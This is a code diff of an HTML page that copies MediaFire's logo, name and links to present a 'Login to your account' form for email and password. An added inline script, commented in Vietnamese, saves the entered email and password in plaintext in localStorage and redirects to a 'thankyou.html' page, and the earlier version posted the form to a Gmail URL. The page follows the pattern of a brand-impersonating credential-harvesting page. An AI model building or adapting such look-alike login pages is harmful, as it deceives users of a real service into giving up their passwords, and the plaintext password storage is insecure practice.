@@ -6,60 +6,78 @@
   <title>Login to your account</title>
   <link rel="stylesheet" href="style.css">
   <link rel="icon" href="./image/favicon.png" type="image/png" />
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 </head>
 
 <body>
-   <div class="header-box">
-<div class="header-left">
-  <a href="https://www.mediafire.com/" target="_blank" class="logo-link">
-    <img src="./image/png-transparent-mediafire-1-hd-logo.png" class="header-logo" alt="Logo">
-    <h1>Mediafire</h1>
-  </a>
-</div>
-<div class="header-right">
-  <a href="https://www.mediafire.com/upgrade/" class="upgrade-btn" target="_blank">Upgrade</a>
-  <a href="https://www.mediafire.com/upgrade/" class="signup-btn" target="_blank">Sign Up</a>
-  <a href="https://www.mediafire.com/login/" class="login-btn" target="_blank">
-    Login
-    <i class="fab fa-facebook-f"></i>
-    <i class="fab fa-twitter"></i>
-  </a>
-</div>
-</div>
- <div class="page-content">
-    <div class="container">
-<form action="https://mail.google.com/mail/u/0/?tab=rm&ogbl#inbox" method="POST">
-
-  <h1>Login to your account</h1>
-
-  <div class="input-field">
-    <input type="email" name="email" required>
-    <label>Enter your email</label>
-  </div>
-
-  <div class="input-field">
-    <input type="password" name="password" required>
-    <label>Enter your password</label>
-  </div>
-
-  <div class="forget">
-    <label for="remember">
-      <input type="checkbox" id="remember">
-      <p>Remember me</p>
-    </label>
-    <a href="https://www.mediafire.com/lost_password.php">Forgot password?</a>
-  </div>
-
-  <button type="submit">Login</button>
-
-  <div class="Register">
-    <p>Don't have an account? <a href="#">Register</a></p>
-  </div>
-</form>
-
-        </div>
+  <div class="header-box">
+    <div class="header-left">
+      <a href="https://www.mediafire.com/" target="_blank" class="logo-link">
+        <img src="./image/png-transparent-mediafire-1-hd-logo.png" class="header-logo" alt="Logo">
+        <h1>Mediafire</h1>
+      </a>
     </div>
-  <script src="script.js"></script>
+    <div class="header-right">
+      <a href="https://www.mediafire.com/upgrade/" class="upgrade-btn" target="_blank">Upgrade</a>
+      <a href="https://www.mediafire.com/upgrade/" class="signup-btn" target="_blank">Sign Up</a>
+      <a href="https://www.mediafire.com/login/" class="login-btn" target="_blank">
+        Login
+        <i class="fab fa-facebook-f"></i>
+        <i class="fab fa-twitter"></i>
+      </a>
+    </div>
+  </div>
+
+  <div class="page-content">
+    <div class="container">
+      <form id="loginForm" method="POST" onsubmit="return false;">
+        <h1>Login to your account</h1>
+
+        <div class="input-field">
+          <input type="email" name="email" required>
+          <label>Enter your email</label>
+        </div>
+
+        <div class="input-field">
+          <input type="password" name="password" required>
+          <label>Enter your password</label>
+        </div>
+
+        <div class="forget">
+          <label for="remember">
+            <input type="checkbox" id="remember">
+            <p>Remember me</p>
+          </label>
+          <a href="https://www.mediafire.com/lost_password.php">Forgot password?</a>
+        </div>
+
+        <button type="submit">Login</button>
+
+        <div class="Register">
+          <p>Don't have an account? <a href="#">Register</a></p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Lấy dữ liệu từ form
+      const email = form.email.value;
+      const password = form.password.value;
+
+      // Lưu vào localStorage (lưu tạm trên máy user)
+      localStorage.setItem('savedEmail', email);
+      localStorage.setItem('savedPassword', password);
+
+      // Chuyển sang trang cảm ơn (bạn tạo sẵn)
+      window.location.href = 'thankyou.html';
+    });
+  </script>
+
 </body>
 </html>
